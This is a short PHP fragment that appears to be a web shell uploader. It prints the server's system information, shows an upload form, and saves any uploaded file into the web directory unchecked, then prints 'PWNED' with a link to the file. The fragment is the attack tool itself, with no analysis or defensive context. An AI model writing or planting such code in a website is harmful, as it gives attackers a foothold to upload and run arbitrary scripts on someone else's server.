echo "<br>";
echo "<br>".php_uname()."<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='upl'><input type='submit' name='upload' value='upload'>
</form>";
if($_POST['upload']) {
	$rooterror = $_FILES['upl']['name'];
    if(@copy($_FILES['upl']['tmp_name'], $rooterror)) {
    echo "PWNED <a href='$rooterror'>OK-Click!</a>";
    } else {
    echo "FAIL!";
    }
}
